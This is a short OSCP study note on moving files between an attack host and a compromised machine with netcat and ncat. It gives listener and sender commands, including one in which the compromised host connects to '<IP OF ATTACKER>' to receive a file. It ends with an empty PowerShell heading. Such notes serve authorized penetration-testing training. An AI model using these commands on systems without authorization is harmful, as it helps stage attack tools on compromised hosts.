---
permalink: oscp/techniques/file-transfer/untitled-2
title: Untitled
type: note
---

## Netcat

#### NetCat - Compromised machine listening on Port 8000
```bash
nc -l -p 8000 > <FILE TO SAVE DATA TO>
```
- `Netcat` takes whatever data it receives and writes it to the specified file

#### Ncat - Compromised machine listening on port 8000
```bash
ncat -l -p 8000 --recv-only > <FILE TO SAVE DATA TO>
```

#### NetCat - Attack Host - Sending File to compromised machine
```bash
wget -q <URL TO FILE> #GET URL CONTENTS FIRST
```

```bash
nc -q 0 <TARGET IP> <PORT> < <FILE>
```
- This sends the contents of `<FILE>` to the `<FILE>` on `<TARGET IP>`

#### Ncat - Attack Host - Sending File to compromised machine
```bash
wget -q <URL TO FILE> #GET URL CONTENTS FIRST
```

```bash
ncat --send-only <TARGET IP> <PORT> < <FILE>
```

#### Attack Host - Sending File as Input to Netcat
```bash
sudo nc -l -p 443 -q 0 < <FILE>
```

#### Compromised machine connects to receive file
```bash
nc <IP OF ATTACKER> <PORT> > <FILE>
```

#### Attack Host - Sending File as Input to Ncat
```bash
sudo ncat -l -p <PORT> --send-only < <FILE>
```

#### Compromised Machine Connect to Ncat to Receive the File
```bash
ncat <IP> <PORT> --recv-only > <FILE>
```


---
## Power shell Session File Transfer


